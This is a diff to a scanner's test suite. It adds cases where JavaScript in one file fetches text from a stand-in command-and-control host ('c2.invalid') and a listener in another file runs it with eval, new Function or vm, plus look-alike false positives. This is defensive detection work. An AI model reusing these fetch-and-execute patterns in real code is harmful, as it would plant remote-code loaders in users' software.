@@ -3,7 +3,9 @@ received value takes from one file of a package to another (items 8 and 9
 of the backlog: several hops, class methods called directly, a class
 through a namespace, static methods, re-exports, wrappers), environment
 variables as the channel between files (item 7), and the evasions and
-crafted false positives of the adversarial pass (item 11).
+crafted false positives of the adversarial pass (item 11); since 0.1.8 an
+event emitter between files (a value received and emitted in one file,
+run by a listener in another).
 
 Each case is a small package of inert text: hosts are .invalid, nothing
 is executed. `want` is the sorted (file, category) the follower reports;
@@ -16,6 +18,8 @@ from lazaret.scanner import core
 U = "'https://c2.invalid/p'"
 PY_NET = "import requests\n\ndef pull():\n    return requests.get(" + U + ").text\n"
 JS_NET = "const https = require('https');\n\nfunction pull() {\n  return fetch(" + U + ").then((r) => r.text());\n}\n"
+EMIT_NET = ("const EventEmitter = require('events');\nconst bus = new EventEmitter();\n"
+            "fetch(" + U + ").then((r) => r.text()).then((c) => bus.emit('code', c));\nmodule.exports = { bus };\n")
 
 
 def py(files):
@@ -260,9 +264,54 @@ ADVERSARIAL = [
                                                    "index.js": "const util = require('./util');\n"
                                                                "fetch(" + U + ").then((r) => r.text()).then(util.execute);\n"}),
      [("index.js", RUN_THERE)]),
+    # an event emitter between files (0.1.8): emitted where it is received, run by a listener
+    ("an event emitter", js({"net.js": EMIT_NET, "run.js": "const { bus } = require('./net');\nbus.on('code', (c) => eval(c));\n"}),
+     [("run.js", RECEIVED)]),
+    ("a listener given by name", js({"net.js": EMIT_NET, "run.js": "const { bus } = require('./net');\nbus.on('code', eval);\n"}),
+     [("run.js", RECEIVED)]),
+    ("a once listener that is a function", js({"net.js": EMIT_NET,
+                                               "run.js": "const { bus } = require('./net');\n"
+                                                         "bus.once('code', function (src) {\n  new Function(src)();\n});\n"}),
+     [("run.js", RECEIVED)]),
+    ("process as the emitter", js({"net.js": "fetch(" + U + ").then((r) => r.text()).then((b) => process.emit('boot', b));\n",
+                                   "run.js": "process.on('boot', (x) => { require('vm').runInThisContext(x); });\n"}),
+     [("run.js", RECEIVED)]),
+    ("an emitter a third module exports", js({"ev.js": "const E = require('events');\nmodule.exports = new E();\n",
+                                              "net.js": "const bus = require('./ev');\n"
+                                                        "fetch(" + U + ").then((r) => r.text()).then((c) => bus.emit('code', c));\n",
+                                              "run.js": "const bus = require('./ev');\nbus.on('code', (c) => eval(c));\n"}),
+     [("run.js", RECEIVED)]),
+    ("a listener after a comment with astral characters",
+     js({"net.js": "/* \U0001d41a\U0001f600 */ " + EMIT_NET,
+         "run.js": "const { bus } = require('./net'); /* \U0001f600 */ bus.on('code', (c) => eval(c));\n"}),
+     [("run.js", RECEIVED)]),
 ]
 # Crafted false positives: each looks like a flow and is not one.
 ADVERSARIAL_QUIET = [
+    ("an emitted constant", js({"net.js": "const E = require('events');\nconst bus = new E();\nfetch(" + U + ");\n"
+                                          "bus.emit('code', 'console.log(1)');\nmodule.exports = { bus };\n",
+                                "run.js": "const { bus } = require('./net');\nbus.on('code', (c) => eval(c));\n"})),
+    ("a listener that logs", js({"net.js": EMIT_NET, "run.js": "const { bus } = require('./net');\n"
+                                                               "bus.on('code', (c) => console.log(c));\n"})),
+    ("another event", js({"net.js": EMIT_NET, "run.js": "const { bus } = require('./net');\nbus.on('data', (c) => eval(c));\n"})),
+    ("an emitter and a listener in one file", js({"net.js": EMIT_NET + "bus.on('code', (c) => eval(c));\n",
+                                                  "other.js": "module.exports = 1;\n"})),
+    ("two classes' own emitters", js({"net.js": "const E = require('events');\nclass A extends E {\n"
+                                                "  load() { fetch(" + U + ").then((r) => r.text()).then((c) => "
+                                                "this.emit('code', c)); }\n}\nmodule.exports = { A };\n",
+                                      "run.js": "const E = require('events');\nclass B extends E {\n"
+                                                "  constructor() { super(); this.on('code', (c) => eval(c)); }\n}\n"
+                                                "module.exports = { B };\n"})),
+    ("an emitter each function is given", js({"net.js": "module.exports = (ee) => fetch(" + U + ")"
+                                                         ".then((r) => r.text()).then((c) => ee.emit('code', c));\n",
+                                               "run.js": "module.exports = (ee) => ee.on('code', (c) => eval(c));\n"})),
+    # a file that runs what it receives itself is the single-file test's; its emit is only a comment
+    ("an emit in a comment", js({"net.js": "const E = require('events');\nconst bus = new E();\n"
+                                           "fetch(" + U + ").then((r) => r.text()).then((c) => eval(c));\n"
+                                           "// then: bus.emit('code', c);\nmodule.exports = { bus };\n",
+                                 "run.js": "const { bus } = require('./net');\nbus.on('code', (c) => eval(c));\n"})),
+    ("a listener in a comment", js({"net.js": EMIT_NET, "run.js": "const { bus } = require('./net');\n"
+                                                                 "/* bus.on('code', eval); */\n"})),
     ("a runner fed only local strings", js({"util.js": "exports.execute = (code) => eval(code);\n",
                                             "index.js": "const { execute } = require('./util');\nconst https = require('https');\n"
                                                         "execute('1 + 1');\nhttps.get(" + U + ", (r) => r.resume());\n"})),
@@ -291,13 +340,9 @@ ADVERSARIAL_QUIET = [
                                                                         "x = getattr(_net, 'pull')()\njson.loads(x)\n"})),
 ]
 # Known misses, kept here so a change that reads them is noticed (see docs/DESIGN.md §12):
-# an event emitter between files, and two top-level modules of site-packages (in a
-# --deps scan they may be two distributions; a registry scan reads them as one).
+# two top-level modules of site-packages (in a --deps scan they may be two
+# distributions; a registry scan reads them as one).
 KNOWN_MISSES = [
-    ("an event emitter", js({"net.js": "const EventEmitter = require('events');\nconst bus = new EventEmitter();\n"
-                                       "fetch(" + U + ").then((r) => r.text()).then((c) => bus.emit('code', c));\n"
-                                       "module.exports = { bus };\n",
-                             "run.js": "const { bus } = require('./net');\nbus.on('code', (c) => eval(c));\n"})),
     ("two top-level modules", py({"a.py": PY_NET, "b.py": "from a import pull\nexec(pull())\n"})),
 ]
 
